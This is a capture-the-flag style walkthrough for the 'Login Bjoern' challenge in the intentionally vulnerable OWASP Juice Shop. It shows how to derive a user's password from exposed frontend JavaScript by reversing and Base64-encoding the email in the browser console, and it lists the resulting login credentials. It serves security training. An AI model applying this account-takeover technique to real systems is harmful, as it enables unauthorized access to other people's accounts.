# Login Bjoern (Broken Authentication)

## Overview
This challenge demonstrates a **Broken Authentication** vulnerability in the OWASP Juice Shop application.  
By analyzing client-side JavaScript, an attacker can reconstruct a user’s password and gain unauthorized access.  
The vulnerability arises from encoding and authentication logic being exposed on the frontend.

---

## Step-by-Step Solution

### 1. Identify the Target User
Navigate to:
/#/administration
Locate the user:

bjoern.kimminich@gmail.com

---

### 2. Inspect JavaScript Code
Open **Developer Tools** → **Sources** → `main-es.js`  
Click the **“}”** (Pretty Print) icon to format the code.

---

### 3. Analyze Authentication Logic
Search for the following terms inside `main-es.js`:
oauth
password
login
email
split
reverse
join

You’ll find JavaScript code that manipulates user credentials using methods like `split()`, `reverse()`, and `join()`, and then encodes them using `btoa()`.

---

### 4. Understand Key JavaScript Functions
- `btoa()` → Encodes a string in Base64.  
  Example:
  ```javascript
  window.btoa("hello") // Output: aGVsbG8=

atob() → Decodes a Base64-encoded string.
Example:
window.atob("aGVsbG8=") // Output: hello
---
### 5. In the browser console, execute:
"bjoern.kimminich@gmail.com".split("")

This splits the email into an array of characters.

Now reverse it:

"bjoern.kimminich@gmail.com".split("").reverse()
Join it back into a string:

"bjoern.kimminich@gmail.com".split("").reverse().join("")
Output:
moc.liamg@hcinimmik.nreojb

---
### 6. Use the btoa() function:

window.btoa("bjoern.kimminich@gmail.com".split("").reverse().join(""))

Output:

bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=
---
### 7. Log in as Bjoern Kimminich

Use the following credentials on the login page:

Email: bjoern.kimminich@gmail.com
Password: bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=

Login successfully — the Broken Authentication challenge is solved.